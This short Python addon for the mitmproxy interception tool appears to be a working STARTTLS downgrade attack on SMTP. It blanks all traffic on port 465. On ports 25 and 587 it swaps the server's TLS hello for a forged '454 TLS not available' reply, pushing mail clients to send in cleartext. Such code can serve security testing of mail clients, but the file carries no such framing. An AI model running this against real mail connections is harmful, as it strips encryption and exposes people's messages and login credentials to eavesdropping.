from mitmproxy import ctx
from mitmproxy import tcp, http, tls
import mitmproxy
from collections import defaultdict
from mitmproxy import command, flow
from typing import Sequence
import base64
import re
# remove the server hello

class smtp_TCP:
    def __init__(self) -> None:
        self.view = ctx.master.addons.get("view")
    
    def tcp_message(self, flow:tcp.TCPFlow):
        msg = flow.messages[-1] # latest message
        host_name = flow.server_conn.peername # ip, port
        if flow.server_conn.peername[1] == 465:
            msg.content = b""
        if not msg.from_client and (flow.server_conn.peername[1] == 587 or flow.server_conn.peername[1] == 25):
            server_msg = bytearray(msg.content)
            # ctx.log.warn(server_msg)
            # replace server hello with 454
            if msg.content[0] == 0x16 and msg.content[5] == 0x02:
                server_msg[0:] = b'454 TLS not available due to temporary reason\r\n'
                msg.content = server_msg
                ctx.log.info(msg.content)
            
addons = [smtp_TCP()]